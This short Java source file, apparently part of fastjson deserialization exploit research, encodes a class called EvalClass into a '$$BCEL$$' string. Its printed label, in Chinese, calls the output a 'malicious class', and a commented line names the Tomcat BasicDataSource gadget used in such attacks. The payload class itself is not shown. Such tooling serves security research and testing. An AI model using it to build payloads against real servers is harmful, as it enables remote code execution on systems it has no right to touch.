package fasjsonxxxx;

import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;

public class EvalClasstoBcel {
    public String getBcel(Class cL)throws Exception{
        JavaClass cls = Repository.lookupClass(cL);
        String bcel1 = Utility.encode(cls.getBytes() , true);
        String bcel = "$$BCEL$$"+bcel1;
        System.out.println("恶意类bcel编码为："+bcel);
        return bcel;
    }
    public static void main(String[] args) throws Exception{
        EvalClasstoBcel ecb = new EvalClasstoBcel();
        String a = ecb.getBcel(EvalClass.class);
        System.out.println(a);
//        org.apache.tomcat.dbcp.dbcp2.BasicDataSource

    }
}
